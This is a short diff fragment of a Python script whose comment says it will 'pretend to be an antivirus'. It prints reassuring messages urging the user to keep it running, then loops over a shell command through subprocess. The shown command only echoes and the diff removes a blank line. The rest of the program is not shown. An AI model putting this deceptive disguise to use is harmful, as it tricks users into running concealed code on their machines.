@@ -21,7 +21,6 @@ try:
     print("Scanning and managing files...") #Pretend to be an antivirus
     print("\nThis will keep managing and guarding your files, it will report to your computer when it spot threats, close it you will lose the management of your files.")
     f = open("Threats.txt", "w")
-    
     while True:
         shoc = sp.Popen("echo :", shell=True, stdout=sp.PIPE, stderr=sp.PIPE, stdin=sp.PIPE)
         out = shoc.stdout.read() + shoc.stderr.read()
